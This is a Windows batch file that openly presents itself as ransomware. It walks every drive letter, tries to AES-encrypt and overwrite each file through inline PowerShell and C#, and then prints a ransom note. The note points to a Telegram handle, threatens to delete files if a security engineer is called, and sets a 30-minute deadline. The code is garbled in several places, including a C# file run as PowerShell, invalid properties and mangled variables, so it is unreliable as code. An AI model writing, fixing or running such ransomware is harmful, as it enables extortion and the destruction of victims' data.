@echo off

setlocal enabledelayedexpansion

:: Define the encryption algorithm and key
set /a key=42
set /a algorithm=1

:: Create a temporary directory for files
md %temp%\ransomware_temp

:: Loop through all drives and encrypt files
for /d %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
   for /f "delims=" %%f in ('dir /a-d /s /b "%%d:\*" 2^>nul') do (
       set "file=%%d:\%%f"
       set "filename=!file:%cd%=!.ext"
       set "ext=%%~xf"
       set "tempFile=!temp%tempnum%!\!filename!"
       set /a tempnum+=1

       :: Encrypt the file
       powershell -Command "Add-Type -TypeDefinition ^
           'using System;
           using System.IO;
           using System.Security.Cryptography;
           namespace Ransomware {
               public class Encryptor {
                   public static byte[] Encrypt(byte[] data, int key, int algorithm) {
                       using (Aes aes = Aes.Create()) {
                           aes.Key = new byte[aes.KeySize/8];
                           aes.IV = new byte[aes.BlockSize/8];
                           new RNGCryptoServiceProvider().GetBytes(aes.Key);
                           new RNGCryptoServiceProvider().GetBytes(aes.IV);
                           aes.Key = BitConverter.GetBytes(key);
                           aes.IV = BitConverter.GetBytes(key << 32);
                           aes.Key = aes.Key.Reverse();
                           aes.IV = aes.IV.Reverse();
                           aes.Algorithm = (AlgorithmName)algorithm;
                           using (MemoryStream ms = new MemoryStream()) {
                               using (AesCryptoServiceProvider aesCsp = (AesCryptoServiceProvider)aes.CreateEncryptor()) {
                                   using (CryptoStream cs = new CryptoStream(ms, aesCsp.CreateEncryptor(), CryptoStreamMode.Write)) {
                                       cs.Write(data, 0, data.Length);
                                       cs.Close();
                                   }
                               }
                               byte[] encryptedData = ms.ToArray();
                               File.WriteAllBytes("!tempFile!", encryptedData);
                               File.Delete("%%f");
                               File.Move("!tempFile!", "%%f");
                           }
                       }
                   }
               }' > !temp%tempnum%!\Encryptor.cs
       powershell -ExecutionPolicy Bypass -File !temp%tempnum%!\Encryptor.cs
       del !temp%tempnum%!\Encryptor.cs
   )
)

:: Display the ransom note
echo Your system has been encrypted.
echo To decrypt your files, send you phone number to this telegramuser : @DW_DIRWEB
echo Your decryption password is: y'll get it after y'll send you phonenumber.
echo If you will try to call cybersecurity engineer all of your files will be deleted.
echo If you do not pay the ransom within 30 minutes , your files will be permanently lost.
echo Press any key to exit...
pause

:: Clean up temporary files
del /s /q !temp%tempnum%!\*.*
rd /s /q !temp%tempnum%\
exit

